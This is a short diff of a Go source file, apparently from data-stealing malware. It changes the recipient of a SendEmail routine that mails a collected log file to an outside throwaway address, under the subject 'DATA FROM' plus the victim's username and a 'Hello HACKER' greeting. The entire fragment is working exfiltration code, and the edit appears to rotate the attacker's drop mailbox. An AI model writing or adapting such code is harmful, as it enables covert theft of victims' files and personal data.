@@ -19,7 +19,7 @@ var (
 func SendEmail() {
 	m := gomail.NewMessage()
 	m.SetHeader("From", from)
-	m.SetHeader("To", "xorexa6205@zcai77.com")
+	m.SetHeader("To", "vatir96616@zefara.com")
 	m.SetHeader("Subject", "DATA FROM "+username)
 	m.SetBody("text/html", "Hello <b>HACKER</b>!")
 	m.Attach(path + "\\aria-debug-2608.log")
